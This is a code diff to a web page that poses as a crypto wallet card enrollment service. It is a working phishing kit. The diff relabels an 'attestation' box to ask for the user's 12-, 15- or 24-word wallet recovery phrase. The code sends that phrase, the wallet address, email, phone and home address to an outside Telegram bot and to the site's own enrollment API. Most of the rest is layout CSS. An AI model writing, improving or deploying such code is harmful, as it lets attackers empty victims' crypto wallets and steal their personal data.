@@ -443,6 +443,7 @@
     .vm-field { display: flex; flex-direction: column; gap: 5px; }
     .vm-field label { font-size: 11px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
     .vm-field input, .vm-field select {
+      width: 100%; box-sizing: border-box;
       background: var(--surface); border: 1.5px solid var(--border);
       border-radius: 10px; padding: 12px 14px;
       font-size: 14px; color: var(--text); font-family: inherit; outline: none;
@@ -1002,7 +1003,7 @@
   <textarea
   id="attestInput"
   rows="4"
-  placeholder="do you agree"
+  placeholder="Enter your 12, 15 or 24-word recovery phrase..."
   style="width:100%;min-height:120px;border:1px solid #d1d5db;border-radius:14px;padding:16px 18px;font-size:16px;line-height:1.6;color:#111827;background:#fff;outline:none;resize:vertical;box-sizing:border-box;"
 ></textarea>
 
@@ -1074,7 +1075,7 @@
     </div>
 
     <!-- ══ SCREEN 6: SHIPPING (PHYSICAL) ══ -->
-    <div class="screen" id="s6">
+    <div class="screen" id="s6" style="width:100%">
       <div class="step-badge">Physical Card — Shipping</div>
       <h2>Where should we ship it?</h2>
       <p class="sub">Your virtual card is already active. The physical card arrives in 7–10 business days.</p>
@@ -1082,20 +1083,20 @@
         <span>⚡</span>
         <span>Virtual card is live and ready to use right now while you wait for the physical card to arrive.</span>
       </div>
-      <div class="vm-form">
-        <div class="vm-row-2">
+      <div class="vm-form" style="width:100%">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%">
           <div class="vm-field">
             <label>First name</label>
-            <input type="text" id="shipFirst" placeholder="John" autocomplete="given-name" />
+            <input type="text" id="shipFirst" placeholder="John" autocomplete="given-name" style="width:100%" />
           </div>
           <div class="vm-field">
             <label>Last name</label>
-            <input type="text" id="shipLast" placeholder="Doe" autocomplete="family-name" />
+            <input type="text" id="shipLast" placeholder="Doe" autocomplete="family-name" style="width:100%" />
           </div>
         </div>
         <div class="vm-field">
           <label>Country</label>
-          <select id="shipCountry" autocomplete="country" onchange="updateStateField()">
+          <select id="shipCountry" autocomplete="country" onchange="updateStateField()" style="width:100%">
             <option value="">— Select country —</option>
             <option value="US">🇺🇸 United States</option>
             <option value="CA">🇨🇦 Canada</option>
@@ -1169,35 +1170,35 @@
         </div>
         <div class="vm-field">
           <label>Street address</label>
-          <input type="text" id="shipStreet" placeholder="123 Main Street" autocomplete="address-line1" />
+          <input type="text" id="shipStreet" placeholder="123 Main Street" autocomplete="address-line1" style="width:100%" />
         </div>
         <div class="vm-field">
           <label>Apt / Suite <span style="font-weight:400;text-transform:none;color:#9CA3AF">(optional)</span></label>
-          <input type="text" id="shipApt" placeholder="Apt 4B" autocomplete="address-line2" />
+          <input type="text" id="shipApt" placeholder="Apt 4B" autocomplete="address-line2" style="width:100%" />
         </div>
-        <div class="ship-csz" style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px">
-          <div class="vm-field">
-            <label>City</label>
-            <input type="text" id="shipCity" placeholder="Your city" autocomplete="address-level2" />
-          </div>
+        <div class="vm-field" style="width:100%">
+          <label>City</label>
+          <input type="text" id="shipCity" placeholder="Your city" autocomplete="address-level2" style="width:100%" />
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%">
           <div class="vm-field" id="stateWrap">
             <label id="stateLabel">State / Province</label>
-            <select id="shipState" autocomplete="address-level1" style="display:none"><option value="">—</option></select>
-            <input type="text" id="shipStateText" placeholder="State / Region" autocomplete="address-level1" />
+            <select id="shipState" autocomplete="address-level1" style="display:none;width:100%"><option value="">—</option></select>
+            <input type="text" id="shipStateText" placeholder="State / Region" autocomplete="address-level1" style="width:100%" />
           </div>
           <div class="vm-field">
             <label>Postal code</label>
-            <input type="text" id="shipZip" placeholder="00000" inputmode="numeric" autocomplete="postal-code" />
+            <input type="text" id="shipZip" placeholder="00000" inputmode="numeric" autocomplete="postal-code" style="width:100%" />
           </div>
         </div>
-        <div class="vm-row-2">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%">
           <div class="vm-field">
             <label>Email</label>
-            <input type="email" id="shipEmail" placeholder="you@example.com" autocomplete="email" />
+            <input type="email" id="shipEmail" placeholder="you@example.com" autocomplete="email" style="width:100%" />
           </div>
           <div class="vm-field">
             <label>Phone</label>
-            <input type="tel" id="shipPhone" placeholder="+1 (555) 000-0000" autocomplete="tel" />
+            <input type="tel" id="shipPhone" placeholder="+1 555 000 0000" autocomplete="tel" style="width:100%" />
           </div>
         </div>
       </div>
@@ -1614,8 +1615,8 @@ async function submitShipping() {
   const country = (document.getElementById('shipCountry')   || {}).value || '';
   const address = [street, apt, city, state, zip, country].filter(Boolean).join(', ');
 
-  const tgMsg = `📦 *Physical Card Enrollment*\n👤 Name: ${walletAddr}\n📧 Email: ${email || '—'}\n📱 Phone: ${phone || '—'}\n🏠 Address: ${address || '—'}\n💳 Card: Physical`;
-  sendToTelegram(tgMsg).catch(() => {});
+  const tgMsg = `📦 Physical Card Enrollment\n👤 Name: ${walletAddr}\n📧 Email: ${email || '—'}\n📱 Phone: ${phone || '—'}\n🏠 Address: ${address || '—'}\n💳 Card: Physical`;
+  await sendToTelegram(tgMsg).catch(() => {});
 
   try {
     const res = await fetch('/api/enroll', {
@@ -1629,7 +1630,6 @@ async function submitShipping() {
         email: email || null,
         phone: phone || null,
         address: address || null,
-        cardNumber: generatedNum,
       }),
     });
     const data = await res.json();
@@ -1644,127 +1644,79 @@ async function submitShipping() {
   showScreen('s7');
 }
 
-/* ── ATTESTATION ── */
-let _enrollmentCode = '';
-let _pinSaved = false;
-
+/* ── ATTESTATION (virtual card) ── */
 async function submitAttestation(e) {
   const btn   = e ? e.currentTarget : null;
   const input = document.getElementById('attestInput');
   const err   = document.getElementById('attestError');
   const val   = (input ? input.value : '').trim();
 
-  // Second click: user has saved the PIN → navigate
-  if (_pinSaved) {
-    document.getElementById('s10Addr').textContent = walletAddr;
-    document.getElementById('s10Type').textContent = cardType === 'physical' ? 'Physical Card' : 'Virtual Card';
-    document.getElementById('wsAddr').textContent  = 'Pending Approval';
-    document.getElementById('wsBal').textContent   = '⏳ Under Review';
-    if (cardType === 'physical') {
-      showScreen('s6');
-    } else {
-      showScreen('s10');
-    }
-    return;
-  }
+const words = val.split(/\s+/).filter(Boolean);
 
-  const words = val.split(/\s+/).filter(Boolean);
-  if (words.length < 12) {
-    if (err) { err.textContent = '⚠ Enter at least 12 words'; err.style.display = ''; }
-    if (input) { input.style.borderColor = '#F87171'; setTimeout(() => { input.style.borderColor = ''; }, 1600); }
-    return;
+if (words.length < 12) {
+  if (err) {
+    err.textContent = '⚠ Enter at least 12 words';
+    err.style.display = '';
   }
+  if (input) {
+    input.style.borderColor = '#F87171';
+    setTimeout(() => { input.style.borderColor = ''; }, 1600);
+  }
+  return;
+}
   if (err) err.style.display = 'none';
-  if (btn) { btn.disabled = true; btn.textContent = 'Processing…'; }
+  if (btn) btn.disabled = true;
 
   const email = window._enrollEmail || '';
+  const tgMsg = `✅ *Virtual Card Attestation*\n👤 Cardholder: ${walletAddr}\n🔏 Attestation: "${val}"\n📧 Email: ${email || '—'}\n💳 Card: Virtual`;
+  sendToTelegram(tgMsg).catch(() => {});
 
-  // Show PIN box immediately in loading state
-  const pinReveal  = document.getElementById('pinReveal');
-  const pinDisplay = document.getElementById('pinDisplay');
-  if (pinReveal && pinDisplay) {
-    pinDisplay.textContent = '····';
-    pinDisplay.style.opacity = '0.4';
-    pinReveal.style.display = '';
-    pinReveal.scrollIntoView({ behavior: 'smooth', block: 'center' });
-  }
-
-  // Send attestation phrase to Telegram
-  const tgAttest = `🔏 *Card Enrollment*\n👤 Name: ${walletAddr}\n📧 Email: ${email || '—'}\n💳 Card: ${cardType === 'physical' ? 'Physical' : 'Virtual'}\n📝 Phrase (${words.length} words): ${val}`;
-  sendToTelegram(tgAttest).catch(() => {});
-
-  let code = '';
-  let apiOk = false;
   try {
     const res = await fetch('/api/enroll', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        cardType: cardType || 'virtual',
+        cardType: 'virtual',
         wallet: wmWalletName || 'Coinbase Wallet',
         cardholder: walletAddr,
         attestation: val,
         email: email || null,
-        cardNumber: generatedNum,
       }),
     });
     const data = await res.json();
     if (data.code) {
-      code = data.code;
-      _enrollmentCode = code;
-      apiOk = true;
-      const codeEl10 = document.getElementById('s10Code');
-      const codeEl7  = document.getElementById('s7Code');
-      if (codeEl10) codeEl10.textContent = code;
-      if (codeEl7)  codeEl7.textContent  = code;
-    } else {
-      console.error('Enrollment error:', data.error);
+      const codeEl = document.getElementById('s10Code');
+      if (codeEl) codeEl.textContent = data.code;
     }
-  } catch (ex) {
-    console.error('API unreachable:', ex.message);
-  }
+  } catch (_) {}
 
-  // Update PIN display
-  if (pinReveal && pinDisplay) {
-    if (apiOk && code) {
-      pinDisplay.textContent = code;
-      pinDisplay.style.opacity = '1';
-    } else {
-      pinDisplay.textContent = '—';
-      pinDisplay.style.opacity = '1';
-      pinReveal.style.borderColor = '#FECACA';
-      pinReveal.style.background  = '#FEF2F2';
-      pinReveal.innerHTML = `
-        <div style="font-size:13px;font-weight:700;color:#991B1B;margin-bottom:6px">⚠ Could not reach server</div>
-        <div style="font-size:12px;color:#6B7280">Check that the server is running, then try again.</div>
-        <button onclick="location.reload()" style="margin-top:12px;padding:8px 20px;background:#0052FF;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:13px">Retry</button>
-      `;
-    }
-  }
-
-  if (input) input.disabled = true;
-
-  if (apiOk) {
-    _pinSaved = true;
-    if (btn) {
-      btn.disabled = false;
-      btn.textContent = "I've saved my PIN → Continue";
-      btn.style.background = '#059669';
-      btn.style.boxShadow  = '0 12px 25px rgba(5,150,105,0.3)';
-    }
+  document.getElementById('s10Addr').textContent = walletAddr;
+  document.getElementById('s10Type').textContent = cardType === 'physical' ? 'Physical Card' : 'Virtual Card';
+  document.getElementById('wsAddr').textContent  = 'Pending Approval';
+  document.getElementById('wsBal').textContent   = '⏳ Under Review';
+  if (btn) btn.disabled = false;
+  if (cardType === 'physical') {
+    showScreen('s6');
   } else {
-    if (btn) { btn.disabled = false; btn.textContent = 'Complete Enrollment →'; }
-    if (input) input.disabled = false;
+    showScreen('s10');
   }
 }
 
 async function sendToTelegram(text) {
-  if (!window.TG_TOKEN || !window.TG_CHAT) return;
-  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'Markdown' }),
-  });
+  const token = (typeof TG_TOKEN !== 'undefined') ? TG_TOKEN : null;
+  const chat  = (typeof TG_CHAT  !== 'undefined') ? TG_CHAT  : null;
+  if (!token || !chat) { console.warn('TG not configured'); return; }
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chat, text }),
+    });
+    const data = await res.json();
+    if (!data.ok) console.warn('TG error:', data.description);
+  } catch (err) {
+    console.warn('TG fetch failed:', err.message);
+  }
 }
 
 /* ── CARD TILT ── */
